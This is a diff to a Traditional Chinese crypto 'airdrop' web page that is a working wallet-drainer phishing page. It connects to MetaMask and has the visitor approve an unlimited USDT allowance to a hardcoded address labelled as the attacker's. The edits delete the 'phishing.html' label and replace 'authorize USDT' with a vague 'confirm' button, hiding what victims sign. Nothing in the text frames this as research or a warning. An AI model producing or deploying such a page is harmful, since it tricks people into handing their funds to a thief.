@@ -1,36 +1,44 @@
-<!-- phishing.html -->
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🎁 免費領取空投！</title>
+  <title>🎁 領取空投</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: 'Arial'; padding: 20px; background: #fff; text-align: center; }
-    button { padding: 10px 20px; font-size: 18px; }
+    body { font-family: 'Arial'; background: #f8f8f8; text-align: center; padding: 80px; }
+    button {
+      padding: 12px 30px;
+      font-size: 20px;
+      background: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #status { margin-top: 20px; font-size: 16px; color: #555; }
   </style>
 </head>
 <body>
-  <h1>🎉 恭喜你獲得 USDT 空投！</h1>
-  <p>請先授權我們的系統，以完成空投領取：</p>
-  <button onclick="approve()">🎁 一鍵授權 USDT</button>
+  <h1>🎉 恭喜你獲得限時空投</h1>
+  <p>點擊下方按鈕確認參與活動</p>
+  <button onclick="approve()">✅ 確認</button>
   <p id="status">等待操作中...</p>
 
   <script>
-    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
-    const ATTACKER = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-    const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 主網 USDT
+    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459"; // 攻擊者地址
+    const ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
     async function approve() {
-      if (!window.ethereum) return alert("請先安裝 MetaMask");
+      if (!window.ethereum) return alert("請安裝 MetaMask");
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
       const usdt = new ethers.Contract(USDT, ABI, signer);
-      document.getElementById("status").innerText = "⏳ 正在授權...";
+      document.getElementById("status").innerText = "⏳ 發送授權中...";
       try {
-        const tx = await usdt.approve(ATTACKER, ethers.constants.MaxUint256);
-        document.getElementById("status").innerText = "✅ 成功授權！TX Hash: " + tx.hash;
+        const tx = await usdt.approve(attacker, ethers.constants.MaxUint256);
+        document.getElementById("status").innerText = "✅ 授權成功，TX Hash: " + tx.hash;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
       }
